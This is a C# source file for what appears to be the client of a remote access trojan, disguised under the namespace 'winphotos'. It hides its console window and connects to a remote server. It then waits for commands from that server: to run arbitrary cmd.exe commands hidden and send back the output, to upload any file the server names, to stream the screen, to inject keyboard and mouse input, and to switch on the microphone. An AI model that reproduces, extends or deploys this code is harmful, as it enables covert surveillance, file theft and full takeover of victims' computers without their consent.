using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

namespace winphotos
{
    class Program
    {
        static void Main()
        {
            ShowWindow(GetConsoleWindow(), 0);
            Microphone.Init();
            ServerConnection.ConnectToServer();
            while (true) 
            {
                byte[] Buffer = new byte[1024];
                try
                {
                    int Received = ServerConnection.Socket.Receive(Buffer);
                    if (Received == 0)// Disconnected from the server
                    {
                        ServerConnection.ConnectToServer();
                        continue;
                    }
                    if (Buffer[0] == 0) // Cmd command
                    {
                        string Command = Encoding.ASCII.GetString(Buffer, 1, Received - 1);// Skip the first code byte
                        bool Executed = ExecuteCommand(Command, out string Output);
                        if (!Executed)
                            Output = "Failed to execute command (terminated the thread).";
                        byte[] ResponseBuffer = Encoding.ASCII.GetBytes(Output);
                        ServerConnection.Socket.Send(ResponseBuffer);
                    }
                    else if (Buffer[0] == 1) // Upload file to server
                    {
                        string FileName = Encoding.ASCII.GetString(Buffer, 1, Received - 1);
                        Console.WriteLine("Upload file to server " + FileName);
                        uint fileAttribues = GetFileAttributes(FileName);
                        bool fileExists = fileAttribues != INVALID_FILE_ATTRIBUTES && fileAttribues != FILE_ATTRIBUTE_DIRECTORY;
                        if (!fileExists)
                        {
                            Console.WriteLine("File does not exist");
                            ServerConnection.Socket.Send(new byte[] { 69 });
                            continue;
                        }
                        long FileSize = new FileInfo(FileName).Length;
                        ServerConnection.Socket.Send(BitConverter.GetBytes(FileSize));
                        FileStream stream = null;
                        try
                        {
                            stream = new FileStream(FileName, FileMode.Open);
                            int read = 0;
                            byte[] buffer = new byte[2048];
                            while ((read = stream.Read(buffer, 0, 2048)) != 0)
                            {
                                ServerConnection.Socket.Send(buffer, read, SocketFlags.None);
                            }
                            stream.Close();
                        }
                        catch
                        {
                            if (stream != null)
                                stream.Close();
                        }

                    }
                    else if (Buffer[0] == 3) // Share screen
                    {
                        if (Buffer.Length == 1) continue;
                        byte code = Buffer[1];
                        Console.WriteLine("Share screen: " + (code == 1));
                        if (code == 0) ShareScreen.Running = false;
                        else if (!ShareScreen.Running) ShareScreen.StartShareScreen();
                    }
                    else if (Buffer[0] == 4) // Input injection
                    {
                        Input.Inject(Buffer);
                    }
                    else if(Buffer[0] == 5)
                    {
                        if (Buffer.Length == 1) continue;
                        byte value = Buffer[1];
                        Microphone.Running = value == 1;
                        Console.WriteLine("Microphone " + (value == 1));
                    }
                }
                catch (SocketException)
                {
                    ServerConnection.ConnectToServer();
                    continue;
                }
            }
        }

        static bool ExecuteCommand(string Command, out string Output)
        {
            bool Done = false;
            string output = "";
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Threading.Thread thread = new System.Threading.Thread(() => 
            {
                try
                {
                    process.StartInfo = new System.Diagnostics.ProcessStartInfo()
                    {
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
                        FileName = "cmd.exe",
                        Arguments = "/C " + Command,
                        RedirectStandardError = true,
                        RedirectStandardOutput = true
                    };
                    process.Start();
                    string standardOutput = process.StandardOutput.ReadToEnd();
                    string standardError = process.StandardError.ReadToEnd();
                    output = standardOutput;
                    if (output == "")
                    {
                        if (standardError != "") output = standardError;
                        else output = "No output";
                    }
                    Done = true;
                }
                catch 
                {
                    
                }
            });
            thread.Start();
            Stopwatch watch = new Stopwatch();
            watch.Start();
            while(watch.ElapsedMilliseconds < 500 && !Done) { }
            watch.Stop();
            if (!Done)
            {
                thread.Abort();
                Console.WriteLine("Closing process");
                try
                {
                    process.Close();
                }
                catch { }
            }
            Output = output;
            return Done;
        }

        [System.Runtime.InteropServices.DllImport("kernel32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto, SetLastError = true)]
        static extern uint GetFileAttributes(string lpFileName);
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        const uint FILE_ATTRIBUTE_DIRECTORY = 0x10;
        const uint INVALID_FILE_ATTRIBUTES = 0xffffffff;
    }
}
